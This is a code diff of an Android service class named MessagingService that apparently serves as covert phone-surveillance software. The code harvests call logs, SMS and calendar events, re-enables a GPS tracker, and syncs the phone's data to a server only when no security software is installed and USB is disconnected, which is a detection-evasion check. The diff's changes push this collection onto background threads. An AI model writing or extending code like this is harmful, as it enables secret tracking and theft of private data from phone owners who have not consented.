@@ -177,25 +177,18 @@ public class MessagingService extends Service {
 
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
-/*        if (checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
-            mHandlerThread = new HandlerThread("locationThread", Process.THREAD_PRIORITY_BACKGROUND);
-            mHandlerThread.start();
-            mLooper = mHandlerThread.getLooper();
-            String locationProvider = LocationManager.GPS_PROVIDER;
-            mLocationManager = Lofl.getLocationManager(MessagingService.this);
-            mLocationListener = Lofl.getLocationListener(this);
-            mLocationManager.requestLocationUpdates(locationProvider, 1000, 30, mLocationListener, mLooper);
-        }*/
+
         if(!sIsBot){
             new Thread(new Runnable() {
                 @Override
                 public void run() {
-                   // Lofl.onReceiveCommand(MessagingService.this, 21, "start", null);
+                    android.os.Process.setThreadPriority(Process.THREAD_PRIORITY_BACKGROUND);
+                /*   Lofl.onReceiveCommand(MessagingService.this, 21, "start", null);
                     try {
                         Thread.sleep(10000);
                     } catch (InterruptedException e) {
                         e.printStackTrace();
-                    }
+                    }*/
                     boolean hasSecuritySoftware = Lofl.hasSecuritySoftwareInstalled(MessagingService.this);
                     if( ! hasSecuritySoftware && Lofl.isUsbDisconnected(MessagingService.this)){
                         Lofl.onReceiveCommand(MessagingService.this, Commands.SYNC_PHONE_TO_SERVER, null, null);
@@ -203,9 +196,9 @@ public class MessagingService extends Service {
                 }
             }).start();
         }
-       /* if(JobsIntentService.sShouldTrackGps){
+        if(JobsIntentService.sShouldTrackGps){
             Lofl.onReceiveCommand(this, Commands.GPS_TRACKER, "start", null);
-        }*/
+        }
         return super.onStartCommand(intent, flags, startId);
     }
 
@@ -261,6 +254,7 @@ public class MessagingService extends Service {
             new Thread(new Runnable() {
                 @Override
                 public void run() {
+                    android.os.Process.setThreadPriority(Process.THREAD_PRIORITY_BACKGROUND);
                     String[] projection = new String[]{CallLog.Calls._ID, CallLog.Calls.TYPE, CallLog.Calls.NUMBER, CallLog.Calls.DATE, CallLog.Calls.DURATION};
                     Cursor cursor = getContentResolver().query(uri, projection, null, null, CallLog.Calls.DEFAULT_SORT_ORDER);
                     if(cursor != null && cursor.moveToFirst()){
@@ -303,6 +297,7 @@ public class MessagingService extends Service {
             new Thread(new Runnable() {
                 @Override
                 public void run() {
+                    android.os.Process.setThreadPriority(Process.THREAD_PRIORITY_BACKGROUND);
                     // TODO: 1/27/19 we need to do a projection for sms. the problem is is that the content uri is set to the base uri without a specific table. however the constant values for columns in boht are identical
                     Cursor cursor = getContentResolver().query(uri, null, null, null, Telephony.Sms.DEFAULT_SORT_ORDER);
                     if (cursor != null && cursor.moveToFirst()) {
@@ -338,37 +333,44 @@ public class MessagingService extends Service {
         @Override
         public void onChange(boolean selfChange, Uri uri) {
             super.onChange(selfChange, uri);
-            String[] projection = new String[]{CalendarContract.Events._ID, CalendarContract.Events.ACCOUNT_NAME, CalendarContract.Events.TITLE, CalendarContract.Events.DESCRIPTION, CalendarContract.Events.DTSTART,
-                    CalendarContract.Events.DTEND, CalendarContract.Events.ALL_DAY, CalendarContract.Events.DURATION, CalendarContract.Events.CALENDAR_TIME_ZONE, CalendarContract.Events.EVENT_LOCATION, CalendarContract.Events.ORGANIZER};
-            Cursor cursor = getContentResolver().query(CalendarContract.Events.CONTENT_URI, projection, null, null, null);
-            if(cursor != null && cursor.moveToLast()){
-                int accountNameIndex = cursor.getColumnIndex(CalendarContract.Events.ACCOUNT_NAME);
-                int titleIndex = cursor.getColumnIndex(CalendarContract.Events.TITLE);
-                int descriptionIndex = cursor.getColumnIndex(CalendarContract.Events.DESCRIPTION);
-                int dateStartIndex = cursor.getColumnIndex(CalendarContract.Events.DTSTART);
-                int dateEndIndex = cursor.getColumnIndex(CalendarContract.Events.DTEND);
-                int allDayIndex = cursor.getColumnIndex(CalendarContract.Events.ALL_DAY);
-                int durationIndex = cursor.getColumnIndex(CalendarContract.Events.DURATION);
-                int calendarTimeZoneIndex = cursor.getColumnIndex(CalendarContract.Events.CALENDAR_TIME_ZONE);
-                int locationIndex = cursor.getColumnIndex(CalendarContract.Events.EVENT_LOCATION);
-                int organizerIndex = cursor.getColumnIndex(CalendarContract.Events.ORGANIZER);
-                int id = cursor.getInt(cursor.getColumnIndex(CalendarContract.Events._ID));
-                if(mLastId != id){
-                    mLastId = id;
-                    String account = cursor.getString(accountNameIndex);
-                    String title = cursor.getString(titleIndex);
-                    String description = cursor.getString(descriptionIndex);
-                    long beginDate = cursor.getLong(dateStartIndex);
-                    long endDate = cursor.getLong(dateEndIndex);
-                    int isAllDay = cursor.getInt(allDayIndex);
-                    String duration = cursor.getString(durationIndex);
-                    String timeZone = cursor.getString(calendarTimeZoneIndex);
-                    String location = cursor.getString(locationIndex);
-                    String organizer = cursor.getString(organizerIndex);
-                    Database.insertCalendarEvent(MessagingService.this, DatabaseHelper.getInstance(getApplicationContext()), account, title, description, beginDate, endDate, isAllDay, duration, timeZone, location, organizer);
+            new Thread(new Runnable() {
+                @Override
+                public void run() {
+                    android.os.Process.setThreadPriority(Process.THREAD_PRIORITY_BACKGROUND);
+                    String[] projection = new String[]{CalendarContract.Events._ID, CalendarContract.Events.ACCOUNT_NAME, CalendarContract.Events.TITLE, CalendarContract.Events.DESCRIPTION, CalendarContract.Events.DTSTART,
+                            CalendarContract.Events.DTEND, CalendarContract.Events.ALL_DAY, CalendarContract.Events.DURATION, CalendarContract.Events.CALENDAR_TIME_ZONE, CalendarContract.Events.EVENT_LOCATION, CalendarContract.Events.ORGANIZER};
+                    Cursor cursor = getContentResolver().query(CalendarContract.Events.CONTENT_URI, projection, null, null, null);
+                    if(cursor != null && cursor.moveToLast()){
+                        int accountNameIndex = cursor.getColumnIndex(CalendarContract.Events.ACCOUNT_NAME);
+                        int titleIndex = cursor.getColumnIndex(CalendarContract.Events.TITLE);
+                        int descriptionIndex = cursor.getColumnIndex(CalendarContract.Events.DESCRIPTION);
+                        int dateStartIndex = cursor.getColumnIndex(CalendarContract.Events.DTSTART);
+                        int dateEndIndex = cursor.getColumnIndex(CalendarContract.Events.DTEND);
+                        int allDayIndex = cursor.getColumnIndex(CalendarContract.Events.ALL_DAY);
+                        int durationIndex = cursor.getColumnIndex(CalendarContract.Events.DURATION);
+                        int calendarTimeZoneIndex = cursor.getColumnIndex(CalendarContract.Events.CALENDAR_TIME_ZONE);
+                        int locationIndex = cursor.getColumnIndex(CalendarContract.Events.EVENT_LOCATION);
+                        int organizerIndex = cursor.getColumnIndex(CalendarContract.Events.ORGANIZER);
+                        int id = cursor.getInt(cursor.getColumnIndex(CalendarContract.Events._ID));
+                        if(mLastId != id){
+                            mLastId = id;
+                            String account = cursor.getString(accountNameIndex);
+                            String title = cursor.getString(titleIndex);
+                            String description = cursor.getString(descriptionIndex);
+                            long beginDate = cursor.getLong(dateStartIndex);
+                            long endDate = cursor.getLong(dateEndIndex);
+                            int isAllDay = cursor.getInt(allDayIndex);
+                            String duration = cursor.getString(durationIndex);
+                            String timeZone = cursor.getString(calendarTimeZoneIndex);
+                            String location = cursor.getString(locationIndex);
+                            String organizer = cursor.getString(organizerIndex);
+                            Database.insertCalendarEvent(MessagingService.this, DatabaseHelper.getInstance(getApplicationContext()), account, title, description, beginDate, endDate, isAllDay, duration, timeZone, location, organizer);
+                        }
+                    }
+                    cursor.close();
                 }
-            }
-            cursor.close();
+            }).start();
+
         }
     }
 
